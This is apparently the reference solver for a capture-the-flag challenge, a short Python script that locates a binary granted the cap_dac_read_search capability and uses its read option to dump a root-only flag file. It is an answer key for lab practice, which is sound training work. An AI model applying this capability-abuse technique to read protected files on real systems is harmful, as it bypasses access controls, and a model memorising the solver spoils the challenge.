#!/usr/bin/env python3
"""Reference solver for sysadmin-schedd-cap.

logtool ships with cap_dac_read_search, so its --read bypasses file permissions.
Find that binary in /bins, then read the root-only flag.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _get(url):
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    bins = _get(base + "/bins")
    bin_name = next(n for n, m in bins.items() if "cap_dac_read_search" in m["caps"])
    out = _get(base + f"/exec?bin={bin_name}&args=--read=/flag.txt")
    return out["output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
